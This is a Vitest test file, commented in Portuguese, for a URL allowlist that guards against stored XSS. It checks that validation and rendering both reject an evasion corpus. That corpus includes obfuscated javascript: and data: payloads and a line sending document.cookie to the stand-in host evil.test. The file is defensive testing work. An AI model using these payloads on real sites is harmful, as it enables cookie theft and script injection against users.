/**
 * TCK-016 — Allowlist de esquema (XSS armazenado, MAJOR 1 da revisão da onda 2).
 *
 * O corpus de evasão está aqui, e não espalhado em asserções soltas, porque a
 * regressão que importa não é "esqueceram de checar `javascript:`" — é
 * "checaram de um jeito que o browser contorna". Cada linha do corpus é uma
 * forma que o agente de usuário NORMALIZA antes de navegar, e portanto executa.
 *
 * DUAS CAMADAS, UM PREDICADO. Enquanto este ticket estava em revisão, TCK-003
 * fechou a ESCRITA (DEC-022): `urlSchema` deixou de ser `z.string().url()` e
 * passou a exigir `http:`/`https:`. Esta camada continua obrigatória mesmo
 * assim — linha já gravada não passa por validação nova, e é ela que a página
 * renderiza. O que mudou é que a DECISÃO agora é delegada a `isSafeHttpUrl`, e
 * o bloco "as duas camadas concordam" prova sobre o corpus inteiro que não há
 * como uma aceitar o que a outra recusa.
 */
import { describe, expect, it } from 'vitest';

import {
  ALLOWED_URL_PROTOCOLS,
  isSafeExternalUrl,
  normalizeUrlCandidate,
  toSafeExternalUrl,
} from '@/components/programa/safe-url';
import { SAFE_URL_PROTOCOLS, urlSchema } from '@/lib/schemas';

/**
 * Formas que executam script no browser. Toda uma tem de devolver `null`.
 * `\u0001` é controle C0; TAB/LF/CR são removidos de qualquer posição.
 */
const EVASION_CORPUS: ReadonlyArray<[label: string, payload: string]> = [
  ['minúsculo', 'javascript:alert(1)'],
  ['maiúsculo', 'JAVASCRIPT:alert(1)'],
  ['misto', 'JaVaScRiPt:alert(1)'],
  ['espaço à frente', ' javascript:alert(1)'],
  ['espaços à frente e atrás', '   javascript:alert(1)   '],
  ['TAB no meio do esquema', 'java\tscript:alert(1)'],
  ['LF no meio do esquema', 'java\nscript:alert(1)'],
  ['CR no meio do esquema', 'java\rscript:alert(1)'],
  ['CRLF no meio do esquema', 'java\r\nscript:alert(1)'],
  ['controle C0 à frente', '\u0001javascript:alert(1)'],
  ['NUL à frente', '\u0000javascript:alert(1)'],
  ['TAB à frente', '\tjavascript:alert(1)'],
  ['exfiltração real de cookie', "javascript:fetch('https://evil.test/'+document.cookie)"],
  ['data URI com html', 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='],
  ['data URI com espaço', ' data:text/html,<script>alert(1)</script>'],
  ['vbscript', 'vbscript:msgbox(1)'],
  ['VBSCRIPT maiúsculo', 'VBSCRIPT:msgbox(1)'],
  ['file', 'file:///etc/passwd'],
  ['blob', 'blob:https://evil.test/uuid'],
];

describe('as duas camadas concordam', () => {
  it.each(EVASION_CORPUS)('escrita e renderização recusam %s', (_label, payload) => {
    // Se um dia divergirem, a carga entra pelo lado que aceitou e sai pelo
    // `href` do outro. Esta asserção é o que impede isso.
    expect(urlSchema.safeParse(payload).success).toBe(false);
    expect(toSafeExternalUrl(payload)).toBeNull();
  });

  it('escrita e renderização aceitam a mesma URL legítima', () => {
    const legit = 'https://instagram.com/oficio';
    expect(urlSchema.safeParse(legit).success).toBe(true);
    expect(toSafeExternalUrl(legit)).toBe(legit);
  });

  it('a allowlist da renderização É a de `@/lib/schemas`, não uma cópia', () => {
    expect(ALLOWED_URL_PROTOCOLS).toBe(SAFE_URL_PROTOCOLS);
  });

  it('herda a recusa de credenciais embutidas (host disfarçado)', () => {
    const disguised = 'https://instagram.com:senha@evil.test/oficio';
    expect(urlSchema.safeParse(disguised).success).toBe(false);
    expect(toSafeExternalUrl(disguised)).toBeNull();
  });
});

describe('toSafeExternalUrl — corpus de evasão', () => {
  it.each(EVASION_CORPUS)('rejeita %s', (_label, payload) => {
    expect(toSafeExternalUrl(payload)).toBeNull();
    expect(isSafeExternalUrl(payload)).toBe(false);
  });

  it('a allowlist é fechada em http/https', () => {
    expect([...ALLOWED_URL_PROTOCOLS]).toEqual(['http:', 'https:']);
  });

  it('nenhuma carga do corpus sobrevive como href', () => {
    // Guarda da guarda: um corpus vazio faria o `it.each` acima passar sempre.
    expect(EVASION_CORPUS.length).toBeGreaterThanOrEqual(15);
  });
});

describe('toSafeExternalUrl — o que deve passar', () => {
  it('aceita https e http', () => {
    expect(toSafeExternalUrl('https://instagram.com/oficio')).toBe(
      'https://instagram.com/oficio',
    );
    expect(toSafeExternalUrl('http://oficio.example.com/')).toBe('http://oficio.example.com/');
  });

  it('preserva caminho, querystring e fragmento', () => {
    expect(toSafeExternalUrl('https://x.example/a/b?c=1&d=2#e')).toBe(
      'https://x.example/a/b?c=1&d=2#e',
    );
  });

  it('normaliza o esquema em maiúsculas de uma URL legítima', () => {
    expect(toSafeExternalUrl('HTTPS://Example.com/Path')).toBe('https://example.com/Path');
  });
});

describe('toSafeExternalUrl — entradas degeneradas', () => {
  it('rejeita não-string', () => {
    expect(toSafeExternalUrl(null)).toBeNull();
    expect(toSafeExternalUrl(undefined)).toBeNull();
    expect(toSafeExternalUrl(42)).toBeNull();
    expect(toSafeExternalUrl({ href: 'https://x.example' })).toBeNull();
  });

  it('rejeita vazio e só-espaço', () => {
    expect(toSafeExternalUrl('')).toBeNull();
    expect(toSafeExternalUrl('   ')).toBeNull();
    expect(toSafeExternalUrl('\t\n\r')).toBeNull();
  });

  it('rejeita URL relativa — `socialLinks` é link externo, sempre absoluto', () => {
    expect(toSafeExternalUrl('/instagram')).toBeNull();
    expect(toSafeExternalUrl('//evil.test/x')).toBeNull();
    expect(toSafeExternalUrl('instagram.com/oficio')).toBeNull();
  });
});

describe('devolve a forma NORMALIZADA, nunca a original', () => {
  it('normalizeUrlCandidate reproduz a limpeza do agente de usuário', () => {
    // Esta é a razão de o retorno não poder ser o valor cru: se devolvêssemos
    // `java\tscript:…` porque "não começa com javascript:", a carga iria intacta
    // para o DOM e o browser faria a limpeza que nós recusamos fazer.
    expect(normalizeUrlCandidate('java\tscript:alert(1)')).toBe('javascript:alert(1)');
    expect(normalizeUrlCandidate('  https://x.example  ')).toBe('https://x.example');
    expect(normalizeUrlCandidate('\u0001https://x.example')).toBe('https://x.example');
  });

  it('uma URL legítima com TAB no meio sai sem o TAB', () => {
    const safe = toSafeExternalUrl('https://x.exa\tmple/a');
    expect(safe).not.toBeNull();
    expect(safe).not.toContain('\t');
  });
});
